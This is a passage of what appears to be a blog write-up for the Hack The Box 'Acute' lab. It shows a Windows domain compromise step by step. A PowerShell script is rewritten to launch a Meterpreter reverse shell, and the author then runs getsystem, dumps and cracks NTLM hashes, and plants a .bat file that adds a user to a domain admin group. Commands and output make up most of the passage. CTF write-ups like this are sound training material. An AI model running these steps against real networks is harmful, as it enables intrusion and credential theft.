+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\edavies\Documents&gt; </span><br><span class="line"></span><br><span class="line">Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -credential <span class="variable">$cred</span> -ScriptBlock &#123;<span class="built_in">cat</span> ../desktop/wm.p</span><br><span class="line"></span><br><span class="line">s1&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$securepasswd</span> = <span class="string">&#x27;01000000d08c9ddf0115d1118c7a00c04fc297eb0100000096ed5ae76bd0da4c825bdd9f24083e5c0000000002000000000003</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">660000c00000001000000080f704e251793f5d4f903c7158c8213d0000000004800000a000000010000000ac2606ccfda6b4e0a9d56a20417d2f672</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">80000009497141b794c6cb963d2460bd96ddcea35b25ff248a53af0924572cd3ee91a28dba01e062ef1c026140000000f66f5cec1b264411d8a263a</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">2ca854bc6e453c51&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$passwd</span> = <span class="variable">$securepasswd</span> | ConvertTo-SecureString</span><br><span class="line"></span><br><span class="line"><span class="variable">$creds</span> = New-Object System.Management.Automation.PSCredential (<span class="string">&quot;acute\jmorgan&quot;</span>, <span class="variable">$passwd</span>)</span><br><span class="line"></span><br><span class="line">Invoke-Command -ScriptBlock &#123;Get-Volume&#125; -ComputerName Acute-PC01 -Credential <span class="variable">$creds</span></span><br></pre></td></tr></table></figure>
+
+<p>If we execute this script, then it sets a secure password, and execute ‘Get-Volume’ from ‘jmorgan’ users context. We have to edit it script and modify the invoke command.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -ScriptBlock&#123;((cat &quot;c:\users\imonks\Desktop\wm.ps1&quot; -Raw) -replace &#x27;Get-Volume&#x27;,&#x27;cmd.exe /c c:\utils\reverse.exe&#x27;) | set-content -path c:\users\imonks\Desktop\wm.ps1&#125; -credential <span class="variable">$cred</span></span><br></pre></td></tr></table></figure>
+
+<p>This command will replace the Get-Volume string with cmd.exe &#x2F;c c:\utils\msf.exe We already have reverse.exe in utils directory. So upon execution we get the reverse connection on metasploit. Let’s read the contents of file to make sure our cmd is good to go.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">PS C:\utils&gt; </span><br><span class="line"></span><br><span class="line">Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -credential <span class="variable">$cred</span> -ScriptBlock&#123;<span class="built_in">cat</span> c:\<span class="built_in">users</span>\imonks\</span><br><span class="line"></span><br><span class="line">Desktop\wm.ps1&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$securepasswd</span> = <span class="string">&#x27;01000000d08c9ddf0115d1118c7a00c04fc297eb0100000096ed5ae76bd0da4c825bdd9f24083e5c0000000002000000000003</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">660000c00000001000000080f704e251793f5d4f903c7158c8213d0000000004800000a000000010000000ac2606ccfda6b4e0a9d56a20417d2f672</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">80000009497141b794c6cb963d2460bd96ddcea35b25ff248a53af0924572cd3ee91a28dba01e062ef1c026140000000f66f5cec1b264411d8a263a</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">2ca854bc6e453c51&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$passwd</span> = <span class="variable">$securepasswd</span> | ConvertTo-SecureString</span><br><span class="line"></span><br><span class="line"><span class="variable">$creds</span> = New-Object System.Management.Automation.PSCredential (<span class="string">&quot;acute\jmorgan&quot;</span>, <span class="variable">$passwd</span>)</span><br><span class="line"></span><br><span class="line">Invoke-Command -ScriptBlock &#123;cmd.exe /c c:\utils\reverse.exe&#125; -ComputerName Acute-PC01 -Credential <span class="variable">$creds</span></span><br></pre></td></tr></table></figure>
+
+<p>Everything looks good. Now setup a msf listener and run the below cmd to execute the script.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential <span class="variable">$cred</span> -ScriptBlock&#123;C:\Users\imonks\Desktop\wm.ps1&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Now check the msf listener for reverse connection.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.30:9001 </span><br><span class="line">[*] Sending stage (200262 bytes) to 10.10.11.145</span><br><span class="line">[*] Meterpreter session 1 opened (10.10.14.30:9001 -&gt; 10.10.11.145:49781 ) at 2022-02-16 13:04:30 -0500</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: ACUTE\jmorgan</span><br></pre></td></tr></table></figure>
+
+<p>We are ‘jmorgan’ now. Let’s enumerate now this user.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\jmorgan\Documents&gt;<span class="built_in">whoami</span> /groups</span><br><span class="line"><span class="built_in">whoami</span> /groups</span><br><span class="line"></span><br><span class="line">GROUP INFORMATION</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">Group Name                                 Type             SID          Attributes                                                     </span><br><span class="line">========================================== ================ ============ ===============================================================</span><br><span class="line">Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group             </span><br><span class="line">BUILTIN\Administrators                     Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner</span><br><span class="line">BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group             </span><br><span class="line">NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group             </span><br><span class="line">NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group             </span><br><span class="line">NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group             </span><br><span class="line">Authentication authority asserted identity Well-known group S-1-18-1     Mandatory group, Enabled by default, Enabled group             </span><br><span class="line">Mandatory Label\High Mandatory Level       Label            S-1-16-12288</span><br></pre></td></tr></table></figure>
+
+<p>‘jmorgan’ is member of Administrator. We can just elevate our privs to system.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getsystem</span><br><span class="line">...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure>
+
+<p>We may have pwned the admin, but it is not the actual host, but Hyper-V. You can confirm by running ipconfig.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; ifconfig</span><br><span class="line"></span><br><span class="line">Interface  1</span><br><span class="line">============</span><br><span class="line">Name         : Software Loopback Interface 1</span><br><span class="line">Hardware MAC : 00:00:00:00:00:00</span><br><span class="line">MTU          : 4294967295</span><br><span class="line">IPv4 Address : 127.0.0.1</span><br><span class="line">IPv4 Netmask : 255.0.0.0</span><br><span class="line">IPv6 Address : ::1</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface 14</span><br><span class="line">============</span><br><span class="line">Name         : Microsoft Hyper-V Network Adapter <span class="comment">#2</span></span><br><span class="line">Hardware MAC : 00:15:5d:e8:0a:01</span><br><span class="line">MTU          : 1500</span><br><span class="line">IPv4 Address : 172.16.22.2</span><br><span class="line">IPv4 Netmask : 255.255.255.0</span><br><span class="line">IPv6 Address : fe80::9513:4361:23ec:64fd</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff::</span><br></pre></td></tr></table></figure>
+
+<p>Dump the hash.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; hashdump</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:a29f7623fd11550def0192de9246f46b:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Natasha:1001:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::</span><br><span class="line">WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:24571eab88ac0e2dcef127b8e9ad4740:::</span><br></pre></td></tr></table></figure>
+
+<p>Crack the hash.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">hashcat.exe -m 1000 password.txt rockyou.txt</span><br><span class="line"></span><br><span class="line">a29f7623fd11550def0192de9246f46b:Password@123</span><br><span class="line"></span><br><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Cracked</span><br><span class="line">Hash.Mode........: 1000 (NTLM)</span><br><span class="line">Hash.Target......: a29f7623fd11550def0192de9246f46b</span><br><span class="line">Time.Started.....: Thu Feb 17 02:09:30 2022 (1 sec)</span><br><span class="line">Time.Estimated...: Thu Feb 17 02:09:31 2022 (0 secs)</span><br><span class="line">Kernel.Feature...: Pure Kernel</span><br><span class="line">Guess.Base.......: File (rockyou.txt)</span><br><span class="line">Guess.Queue......: 1/1 (100.00%)</span><br><span class="line">Speed.<span class="comment">#1.........: 59379.6 kH/s (4.14ms) @ Accel:2048 Loops:1 Thr:32 Vec:1</span></span><br><span class="line">Speed.<span class="comment">#3.........:  7827.3 kH/s (14.12ms) @ Accel:128 Loops:1 Thr:64 Vec:1</span></span><br><span class="line">Speed.<span class="comment">#*.........: 67206.9 kH/s</span></span><br><span class="line">Recovered........: 1/1 (100.00%) Digests</span><br><span class="line">Progress.........: 3407872/14344385 (23.76%)</span><br><span class="line">Rejected.........: 0/3407872 (0.00%)</span><br><span class="line">Restore.Point....: 0/14344385 (0.00%)</span><br><span class="line">Restore.Sub.<span class="comment">#1...: Salt:0 Amplifier:0-1 Iteration:0-1</span></span><br><span class="line">Restore.Sub.<span class="comment">#3...: Salt:0 Amplifier:0-1 Iteration:0-1</span></span><br><span class="line">Candidate.Engine.: Device Generator</span><br><span class="line">Candidates.<span class="comment">#1....: rebel91 -&gt; tabbarano666</span></span><br><span class="line">Candidates.<span class="comment">#3....: tabbamarie -&gt; sn78726</span></span><br><span class="line">Hardware.Mon.<span class="comment">#1..: Temp: 57c Util: 37% Core: 571MHz Mem:2304MHz Bus:8</span></span><br><span class="line">Hardware.Mon.<span class="comment">#3..: N/A</span></span><br><span class="line"></span><br><span class="line">Started: Thu Feb 17 02:09:11 2022</span><br><span class="line">Stopped: Thu Feb 17 02:09:32 2022</span><br></pre></td></tr></table></figure>
+
+<p>We got the password. For a hard machine this password is quite weak. I tried to use this password to get hold of ATSSERVER (host), but can’t able to do that. However, we still have access ‘edavies’ shell. We can try to run commands from a different users perspective. Previously we queried the domain to find member of manager group, there was one user awallace , let’s try to use this password from this users context.</p>
+<p>Make sure you are running the next command from ‘edavies’ user shell.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PS C:\utils&gt; <span class="built_in">whoami</span></span><br><span class="line">acute\edavies</span><br><span class="line">PS C:\Users\edavies\Documents&gt; </span><br><span class="line"></span><br><span class="line"><span class="variable">$password</span> = ConvertTo-SecureString <span class="string">&quot;Password@123&quot;</span> -AsPlainText -Force</span><br><span class="line"></span><br><span class="line">PS C:\Users\edavies\Documents&gt; </span><br><span class="line"></span><br><span class="line"><span class="variable">$cred</span> = New-Object System.Management.Automation.PSCredential(<span class="string">&quot;Acute\AWallace&quot;</span>,<span class="variable">$password</span>)</span><br><span class="line"></span><br><span class="line">PS C:\Users\edavies\Documents&gt; </span><br><span class="line"></span><br><span class="line">Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential <span class="variable">$cred</span> -Command &#123;<span class="built_in">whoami</span>&#125;</span><br><span class="line"></span><br><span class="line">acute\awallace</span><br></pre></td></tr></table></figure>
+
+<p>It worked, now we can run commands from awallace user’s context. There’s nothing much available on user directory, however, previously we checked some weird directory in C drive, let’s see if we can access that with this users permission.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\edavies\Documents&gt; </span><br><span class="line"></span><br><span class="line">Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential <span class="variable">$cred</span> -Command &#123;<span class="built_in">ls</span> <span class="string">&#x27;c:\program files\ke</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">epmeon&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    Directory: C:\program files\keepmeon</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name                               PSComputerName                    </span><br><span class="line"></span><br><span class="line">----                 -------------         ------ ----                               --------------                    </span><br><span class="line"></span><br><span class="line">-a----        12/21/2021   2:57 PM            128 keepmeon.bat                       ATSSERVER                         </span><br></pre></td></tr></table></figure>
+
+<p>We can access this directory. Lets read that batch file.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\edavies\Documents&gt; </span><br><span class="line"></span><br><span class="line">Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential <span class="variable">$cred</span> -Command &#123;<span class="built_in">cat</span> <span class="string">&#x27;c:\program files\k</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">eepmeon\keepmeon.bat&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">REM This is run every 5 minutes. For Lois use ONLY</span><br><span class="line"></span><br><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"></span><br><span class="line"> <span class="keyword">for</span> /R %%x <span class="keyword">in</span> (*.bat) <span class="keyword">do</span> (</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> not <span class="string">&quot;%%x&quot;</span> == <span class="string">&quot;%~0&quot;</span> call <span class="string">&quot;%%x&quot;</span></span><br><span class="line"></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>This looks like a schedule script, it runs this batch file every five minutes and checks for any .bat files in the parent directory and if there’s a .bat file then it executes it. The main thing&#x2F;information is that the script is for only lois user and we already know that, lois is the only user who can change group membership. This is from DOCX file.</p>
+<p>So, we can create a batch file which gives ‘awallace’ user administrator privileges of ‘site admin’ group.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential <span class="variable">$cred</span> -ScriptBlock &#123;Set-Content -Path <span class="string">&#x27;c:\program files\Keepmeon\admin.bat&#x27;</span> -Value <span class="string">&#x27;net group site_admin awallace /add /domain&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Check file has been created or not.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\edavies\Documents&gt; </span><br><span class="line"></span><br><span class="line">Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential <span class="variable">$cred</span> -ScriptBlock &#123;<span class="built_in">ls</span> <span class="string">&#x27;c:\program file</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">s\Keepmeon\&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    Directory: C:\program files\Keepmeon</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name                               PSComputerName                    </span><br><span class="line"></span><br><span class="line">----                 -------------         ------ ----                               --------------                    </span><br><span class="line"></span><br><span class="line">-a----         2/16/2022   6:17 PM             44 admin.bat                          ATSSERVER                         </span><br><span class="line"></span><br><span class="line">-a----        12/21/2021   2:57 PM            128 keepmeon.bat                       ATSSERVER                         </span><br></pre></td></tr></table></figure>
+
+<p>Check the contents of file too.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\edavies\Documents&gt; </span><br><span class="line"></span><br><span class="line">Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential <span class="variable">$cred</span> -ScriptBlock &#123;<span class="built_in">cat</span> <span class="string">&#x27;c:\program fil</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">es\Keepmeon\admin.bat&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">net group site_admin awallace /add /domain</span><br></pre></td></tr></table></figure>
+
+<p>Now we need to wait for five minutes to run that schedule job to execute our batch file. Check the whether you added to site_admin group or not.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\edavies\Documents&gt; </span><br><span class="line"></span><br><span class="line">Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential <span class="variable">$cred</span> -Command &#123;<span class="built_in">whoami</span> /groups&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">GROUP INFORMATION</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">Group Name                                   Type             SID                                            Attributes</span><br><span class="line"></span><br><span class="line">                                                     </span><br><span class="line"></span><br><span class="line">============================================ ================ ============================================== ==========</span><br><span class="line"></span><br><span class="line">=====================================================</span><br><span class="line"></span><br><span class="line">Everyone                                     Well-known group S-1-1-0                                        Mandatory </span><br><span class="line"></span><br><span class="line">group, Enabled by default, Enabled group             </span><br><span class="line"></span><br><span class="line">BUILTIN\Users                                Alias            S-1-5-32-545                                   Mandatory </span><br><span class="line"></span><br><span class="line">group, Enabled by default, Enabled group             </span><br><span class="line"></span><br><span class="line">BUILTIN\Pre-Windows 2000 Compatible Access   Alias            S-1-5-32-554                                   Mandatory </span><br><span class="line"></span><br><span class="line">group, Enabled by default, Enabled group             </span><br><span class="line"></span><br><span class="line">BUILTIN\Certificate Service DCOM Access      Alias            S-1-5-32-574                                   Mandatory </span><br><span class="line"></span><br><span class="line">group, Enabled by default, Enabled group             </span><br><span class="line"></span><br><span class="line">BUILTIN\Administrators                       Alias            S-1-5-32-544                                   Mandatory </span><br><span class="line"></span><br><span class="line">group, Enabled by default, Enabled group, Group owner</span><br><span class="line"></span><br><span class="line">NT AUTHORITY\NETWORK                         Well-known group S-1-5-2                                        Mandatory </span><br><span class="line"></span><br><span class="line">group, Enabled by default, Enabled group             </span><br><span class="line"></span><br><span class="line">NT AUTHORITY\Authenticated Users             Well-known group S-1-5-11                                       Mandatory </span><br><span class="line"></span><br><span class="line">group, Enabled by default, Enabled group             </span><br><span class="line"></span><br><span class="line">NT AUTHORITY\This Organization               Well-known group S-1-5-15                                       Mandatory </span><br><span class="line"></span><br><span class="line">group, Enabled by default, Enabled group             </span><br><span class="line"></span><br><span class="line">ACUTE\Domain Admins                          Group            S-1-5-21-1786406921-1914792807-2072761762-512  Mandatory </span><br><span class="line"></span><br><span class="line">group, Enabled by default, Enabled group             </span><br><span class="line"></span><br><span class="line">ACUTE\Managers                               Group            S-1-5-21-1786406921-1914792807-2072761762-1111 Mandatory </span><br><span class="line"></span><br><span class="line">group, Enabled by default, Enabled group             </span><br><span class="line"></span><br><span class="line">ACUTE\Site_Admin                             Group            S-1-5-21-1786406921-1914792807-2072761762-2102 Mandatory </span><br><span class="line"></span><br><span class="line">group, Enabled by default, Enabled group             </span><br><span class="line"></span><br><span class="line">Authentication authority asserted identity   Well-known group S-1-18-1                                       Mandatory </span><br><span class="line"></span><br><span class="line">group, Enabled by default, Enabled group             </span><br><span class="line"></span><br><span class="line">ACUTE\Denied RODC Password Replication Group Alias            S-1-5-21-1786406921-1914792807-2072761762-572  Mandatory </span><br><span class="line"></span><br><span class="line">group, Enabled by default, Enabled group, Local Group</span><br><span class="line"></span><br><span class="line">Mandatory Label\High Mandatory Level         Label            S-1-16-12288                                             </span><br></pre></td></tr></table></figure>
+
+<p>We are domain admin now. Let’s read the final flag from administrators directory.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\edavies\Documents&gt; </span><br><span class="line"></span><br><span class="line">Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential <span class="variable">$cred</span> -ScriptBlock &#123;<span class="built_in">cat</span> <span class="string">&#x27;c:\users\admin</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">istrator\desktop\root.txt&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">b26f815db56b906b843f44f5b0b80555</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2154.jpg"></li>
+</ul>
+<h1 id="Summary-of-knowledge"><a href="#Summary-of-knowledge" class="headerlink" title="Summary of knowledge"></a>Summary of knowledge</h1><ul>
+<li>information gathering by using exiftool</li>
+<li>windows powershell user privileage enum</li>
+<li>powershell port scan using port-scan-tcp.ps1</li>
+<li>msf get screen shots</li>
+<li>invoke-command to execute windows commands</li>
+<li>msf getsystem</li>
+<li>hashcat crack ntlm hash</li>
+<li>add user to domain group to privesc</li>
+</ul>
+<h1 id="Contact-me"><a href="#Contact-me" class="headerlink" title="Contact me"></a>Contact me</h1><ul>
+<li>QQ: 1185151867</li>
+<li>twitter: <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==">https://twitter.com/fdlucifer11<i class="fa fa-external-link-alt"></i></span></li>
+<li>github: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==">https://github.com/FDlucifer<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p><font color="blue">I’m lUc1f3r11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more…</font></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>Buy me a coffee</div>
+  <button>
+    Donate
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="lUc1f3r11 WeChat Pay">
+        <span>WeChat Pay</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="lUc1f3r11 Alipay">
+        <span>Alipay</span>
+      </div>
+
+  </div>
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>lUc1f3r11
+  </li>
+  <li class="post-copyright-link">
